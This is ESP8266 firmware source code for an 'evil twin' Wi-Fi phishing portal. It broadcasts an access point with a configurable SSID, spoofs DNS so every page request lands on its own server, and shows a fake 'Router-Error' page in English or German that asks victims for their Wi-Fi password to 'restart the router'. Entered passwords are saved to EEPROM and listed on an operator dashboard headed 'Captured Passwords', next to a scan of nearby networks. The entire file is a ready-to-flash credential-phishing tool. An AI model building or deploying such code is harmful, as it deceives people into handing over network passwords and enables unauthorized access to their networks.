#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default SSID name
const char* SSID_NAME = "Portal";

// Init system settings
const byte DNS_PORT = 53; //Port for the DNS Server
IPAddress APIP(192, 168, 1, 1); // Gateway

String allPass = ""; //Contains all Passwords 
String currentSSID = ""; //Current SSID
String networks = ""; //Result of the Network Scan
String indexLang = "EN"; //Index Page Language(You can change the Default Language Here)

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.

unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) { //Gets input value of an input field
  String a = webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

//favicon encoded to base64 
String favicon = "<link rel='icon' type='image/x-png' href='data:image/png;base64,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' />";

String indexCSS(){ //CSS of the Index Page
  String _html;
  
  _html += "body {";
  _html += "font-family: Arial, sans-serif;";
  _html += "text-align: left;";
  _html += "background-color: #f2f2f2;";
  _html += "margin: 0;";
  _html += "height: 100vh;";
  _html += "display: flex;";
  _html += "flex-direction: column;";
  _html += "align-items: center;}";
  
  _html += "#networkBar {";
  _html += "background-color: #007bff;";
  _html += "color: #fff;";
  _html += "padding: 22px 0;";
  _html += "width: 100%;";
  _html += "z-index: 1000;}";
  
  _html += "#networkName {";
  _html += "font-weight: bold;";
  _html += "padding: 0 20px;";
  _html += "font-size: 24px;}";
  
  _html += "#content {";
  _html += "flex-grow: 1;";
  _html += "display: flex;";
  _html += "flex-direction: column;";
  _html += "justify-content: center;";
  _html += "padding: 20px;}";

  _html += "#center {align-items: center;}";
  
  _html += "h1 {";
  _html += "color: #333;";
  _html += "font-size: 28px;}";
  
  _html += "p {";
  _html += "color: #555;";
  _html += "max-width: 60rem;";
  _html += "margin: 0;";
  _html += "font-size: 18px;}";
  
  _html += "#routerRestartForm {";
  _html += "display: flex;";
  _html += "flex-direction: column;";
  _html += "margin-top: 20px;}";
  
  _html += "label {";
  _html += "display: block;";
  _html += "margin-bottom: 10px;";
  _html += "color: #333;";
  _html += "font-weight: bold;}";
  
  _html += "input[type=\"password\"] {";
  _html += "width: 100%;";
  _html += "padding: 10px;";
  _html += "margin-bottom: 20px;";
  _html += "border: 1px solid #ccc;";
  _html += "border-radius: 5px;";
  _html += "font-size: 16px;}";
  _html += "button {";
  _html += "background-color: #007bff;";
  _html += "color: #fff;";
  _html += "border: none;";
  _html += "padding: 10px 20px;";
  _html += "border-radius: 5px;";
  _html += "cursor: pointer;";
  _html += "font-size: 18px;}";
  
  _html += "button:hover {";
  _html += "background-color: #0056b3;}";

  return _html;
}

void fixing(){
  String _html = "";

  _html += "<meta charset=\"UTF-8\">";
  _html += "<title>Router-Fehler</title>";
  _html += favicon;
  _html += "<style>" + indexCSS();
  _html += "</style>";
  _html += "</head>";
  _html += "<body>";
  _html += "<div id=\"networkBar\">";
  _html += "<span id=\"networkName\">" + currentSSID + "</span>";
  _html += "</div>";
  _html += "<div id=\"content\">";
  
  if (indexLang == "DE"){
    _html += "<h1 class='center'>Router wird Neugestartet</h1>";
    _html += "<p>Der Router wird nun neugestartet dieser Prozess kann einige Minuten dauern.</p>";
    _html += "<p>Wir Danken ihnen für Ihre Geduld und Hoffen das die Probleme hierdurch behoben werden konnten.</p>";}

  if (indexLang == "EN"){
    _html += "<h1 class='center'>The Router is Restarting</h1>";
    _html += "<p>The router will now restart - this process may take a few minutes.</p>";
    _html += "<p>We thank you for your patience and hope that this solved the problems.</p>";}
    
  _html += "</div>";
  _html += "</body></html>";

  webServer.send(200, "text/html", _html);
}

void Index(){
  String _html = "";

  _html ="<!DOCTYPE html><html><head>";
  _html += "<meta charset=\"UTF-8\">";
  _html += "<title>Router-Fehler</title>";
  _html += favicon;
  _html += "<style>" + indexCSS();
  _html += "</style>";
  _html += "</head>";
  _html += "<body>";
  _html += "<div id=\"networkBar\">";
  _html += "<span id=\"networkName\">" + currentSSID + "</span>";
  _html += "</div>";
  _html += "<div id=\"content\">";
  
  if (indexLang == "DE"){
    _html += "<h1 class='center'>Router-Fehler</h1>";
    _html += "<p>Es wurde ein Problem mit Ihrem Router festgestellt, das eine Neuinitialisierung erfordert.</p>";
    _html += "<p>Dies kann aus verschiedenen Gründen notwendig sein, wie z. B. Sicherheitsupdates oder Leistungsverbesserungen.</p>";
    _html += "<p>Um den Router neu zu starten und das Problem zu beheben, benötigen Sie das Wi-Fi-Passwort, um sicherzustellen, dass nur autorisierte Benutzer Zugriff auf Ihr Netzwerk haben. Das Wi-Fi-Passwort schützt Ihr Netzwerk vor unbefugtem Zugriff und schützt Ihre persönlichen Daten.</p>";
    _html += "<p>Bitte geben Sie das Wi-Fi-Passwort in das unten stehende Feld ein und klicken Sie auf \"Router neu starten\". Dadurch wird der Router neu gestartet, und die meisten Probleme sollten behoben sein.</p>";
    _html += "<p>Wenn Sie das Wi-Fi-Passwort nicht kennen oder es verloren haben, finden Sie es normalerweise auf einem Etikett auf der Rückseite Ihres Routers. Wenn Sie weiterhin Probleme haben, wenden Sie sich an Ihren Internetdienstanbieter oder den Hersteller Ihres Routers.</p>";
    _html += "<form id=\"routerRestartForm\" action=\"/post\">";
    _html += "<input type=\"password\" placeholder=\"Wi-Fi-Passwort\" id=\"wifiPassword\" name=\"wifiPassword\" minlength=\"8\" required>";
    _html += "<button type='submit' id=\"restartButton\">Router neu starten</button>";
    _html += "</form>";
  }

  if (indexLang == "EN"){
    _html += "<h1 class='center'>Router-Error</h1>";
    _html += "<p>A problem with your Router has been detected, it requires it to be reinitialized.</p>";
    _html += "<p>This may be necessary for various reasons, such as: Security updates or performance improvements.</p>";
    _html += "<p>To restart the router and fix the problem, you will need the Wi-Fi password to ensure that only authorized users have access to your network. The Wi-Fi password protects your network from unauthorized access and protects your personal information.</p>";
    _html += "<p>Please enter the Wi-Fi password in the field below and click \"Restart Router\". This will restart the router and most problems should be resolved.</p>";
    _html += "<p>If you don't know the Wi-Fi password or have lost it, you can usually find it on a label on the back of your router. If you continue to have problems, contact your Internet service provider or your router manufacturer.</p>";
    _html += "<form id=\"routerRestartForm\" action=\"/post\">";
    _html += "<input type=\"password\" placeholder=\"Wi-Fi-Password\" id=\"wifiPassword\" name=\"wifiPassword\" minlength=\"8\" required>";
    _html += "<button type='submit' id=\"restartButton\">Restart Router</button>";
    _html += "</form>";
  }
    
  _html += "</div>";
  _html += "</body></html>";

  webServer.send(200, "text/html", _html);
}

void handlePost(){
  String pass = input("wifiPassword"); //Getting the value of the Password field
  pass = "<tr><td>" + pass + "</td><td>" + millis()/1000 + "</td></tr>"; // Adding password and seconds after bootup in a ordered list.
  allPass += pass;                       // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
  }

  passEnd += pass.length(); // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();

  LED(true);

  //redirecting to the index page
  webServer.sendHeader("Location", "/restarting", true);
  webServer.send(302);
}

void postSSID(String postedSSID) {
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAPdisconnect(true);
  delay(5000);
  WiFi.softAP(postedSSID);
  currentSSID = postedSSID;
}

void LED(bool light) { // Turns the LED on(true) and off(false).
  if (light == true){digitalWrite(BUILTIN_LED, LOW);} 
  else {digitalWrite(BUILTIN_LED, HIGH);}
}

String encryptMode(int eC){
  String Return = "";  
  if (eC == 2){Return = "WPA";}
  if (eC == 5){Return = "WEP";}
  if (eC == 4){Return = "WPA2";}
  if (eC == 7){Return = "None";}
  if ((eC != 2) && (eC != 5) && (eC != 4) && (eC != 7)){Return = "????";}
  return Return;
}

String signalColor(int strength){
  String color = "";
  if (strength >= -70){color = "green;";}
  if (strength <= -70){color = "yellow;";}
  if (strength <= -80){color = "red;";}
  return color;
}

void clearPass(){
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  webServer.sendHeader("Location", "/dashboard", true);
  webServer.send(302);
}

void handleLang(){
  indexLang = webServer.arg("lang");
  webServer.sendHeader("Location", "/dashboard", true);
  webServer.send(302);
}

void handleDashboard() {
  String _html = "";
  String acColor = "#ff0003";

  _html += "<html>";
  _html += "<head>";
  _html += favicon;
  _html += "<meta name=\"viewport\" content=\"initial-scale=1.0, width=device-width\">";
  _html += "<title> Captive Portal Dashboard</title>";
  _html += "<style>";
  _html += "body {";
  _html += "background: #36393e;";
  _html += "color: #bfbfbf;";
  _html += "font-family: sans-serif;";
  _html += "margin: 0; }";
  
  _html += ".content {max-width: 800px;margin: auto;}";

  _html += ".button-container {display: flex;";
  _html += "align-items: flex-end;";
  _html += "justify-content: space-between;";
  _html += "align-content: center;";
  _html += "flex-wrap: nowrap;";
  _html += "flex-direction: row;";
  _html += "}";
  
  _html += "table {border-collapse: collapse;";
  _html += "width: 100%;";
  _html += "min-width: 400px;";
  _html += "margin-bottom: 2em;";
  _html += "}";
  
  _html += "th, td {";
  _html += "padding: 10px 6px;";
  _html += "text-align: left;";
  _html += "border-bottom: 1px solid #5d5d5d;";
  _html += "}";

  _html += "td, th {text-align: center;}";
  
  _html += "button, input {";
  _html += "display: inline-block;";
  _html += "height: 42px;";
  _html += "padding: 0 30 0 30px;";
  _html += "color:#fff;";
  _html += "text-align: center;";
  _html += "font-size: 11px;";
  _html += "font-weight: 600;";
  _html += "line-height: 38px;";
  _html += "letter-spacing: .1rem;";
  _html += "text-transform: uppercase;";
  _html += "text-decoration: none;";
  _html += "white-space: nowrap;";
  _html += "background: #2f3136;";
  _html += "border-radius: 4px;";
  _html += "border: none;";
  _html += "cursor: pointer;";
  _html += "box-sizing: border-box;";
  _html += "margin-right: 10px; }";

  _html += "select {";
  _html += "height: 42px;";
  _html += "padding: 6px 10px;";
  _html += "background-color: #2f3136;";
  _html += "border-radius: 4px;";
  _html += "box-shadow: none;";
  _html += "box-sizing: border-box;";
  _html += "color: #d4d4d4;";
  _html += "text-align: center;";
  _html += "border: 0;";
  _html += "margin-right: 20px;";
  _html += "appearance: none;";
  _html += "}";

  _html += "button:hover, input:hover, select:hover {background: #42444a;}";
  
  _html += "h1 {";
  _html += "font-size: 1.7rem;";
  _html += "margin-top: 1rem;";
  _html += "margin-bottom: 1rem;";
  _html += "background: #2f3136;";
  _html += "color: #bfbfbb;";
  _html += "padding: 0.2em 1em;";
  _html += "padding-left: 1rem;";
  _html += "border-radius: 3px;";
  _html += "border-left: solid "+ acColor +" 8px;";
  _html += "font-weight: 100;";
  _html += "padding-left: 9px; }";
  _html += "</style>";
  
  _html += "<body>";
  _html += "<div class=\"content\">";
  _html += "<h1 style=\"padding: 0.2em 0.1em; text-align: center; font-size: 2.5rem;\">Captive Portal Dashboard</h1>";

  _html += "<h1>Language: "+ indexLang +"</h1>";
  _html += "<form action='/language' methode='post'><select name='lang'>";
  _html += "<option value='' disabled selected>Choose</option><option value='DE'>DE</option><option value='EN'>EN</option>";
  _html += "</select><input type=submit value='Change'></form>";

  _html += "<h1>Current SSID: "+ currentSSID + "</h1>";
  _html += "<form><input style='text-align: left; text-transform: uppercase;' type=text placeholder='New SSID' name=ssid></input><input type=submit value=Change SSID action='/?ssid={"+ input("ssid") + "}'></form>";

  _html += "<div class='button-container'>";
  _html += "<h1 style='padding-right: 7rem;'>Captured Passwords</h1>";
  _html += "<form style='display:inline-block;' method='post' action='/clearPass'><button style='display:inline-block;'>Delete Passwords</button></form>";
  _html += "<form style='display:inline-block;' method='post' action='/dashboard?led_off'><button style='display:inline-block;'>Disable LED</button></form>";
  _html += "</div>";
 
  
  if (allPass != "") {
    _html += "<table style='text-align: center;'><tbody><tr><th>Password</th><th>Seconds after Bootup</th></tr>";
    
    //add passwords
    _html += allPass;

    _html += "</tbody></table>";
  } else {
    _html += "<p><b>No Passwords Captured yet!</b></p>";
  }
  _html += "</div>";
  _html += "<div class='content'>";
  _html += "<div class='button-container'>";
  _html += "<h1 style='padding-right: 300px;'>Nearby Networks</h1>";
  _html += "<form style='display:inline-block;' method='post' action='/dashboard'><button style='display:inline-block;'>Reload</button></form>";
  _html += "</div>";
  _html += "<table><tbody><tr><th>SSID</th><th>Mac Adress</th><th>Signal Strength</th><th>Encryption</th></tr>";
  
  //scan and display nearby networks
  int numNetworks = WiFi.scanNetworks();
  for (int i = 0; i < numNetworks; i++) {
    _html += "<tr><td>" + WiFi.SSID(i) + "</td><td>" + WiFi.BSSIDstr(i) + "</td><td style='color: " + signalColor(WiFi.RSSI(i)) + ";'>" + WiFi.RSSI(i) + "</td><td>" + encryptMode(WiFi.encryptionType(i)) + "</td></tr>";
  }
  _html += "</tbody></table>";
  _html += "</div>";
  _html += "</body>";
  _html += "</html>";

  webServer.send(200, "text/html", _html);

  if (webServer.hasArg("ssid")){postSSID(webServer.arg("ssid"));}
  
  if (webServer.hasArg("led_off")){LED(false);}
}

void setup(){
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read EEPROM SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.setSleep(false);

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;
  
  WiFi.softAP(currentSSID);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)

  webServer.on("/", Index);
  webServer.on("/post", handlePost);
  webServer.on("/restarting", fixing);
  webServer.on("/dashboard", handleDashboard);
  webServer.on("/clearPass", clearPass);
  webServer.on("/language", handleLang);
  
  webServer.onNotFound(Index);
  webServer.begin();

  // Enable the built-in LED
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);

}

void loop(){
  dnsServer.processNextRequest();
  webServer.handleClient();
}
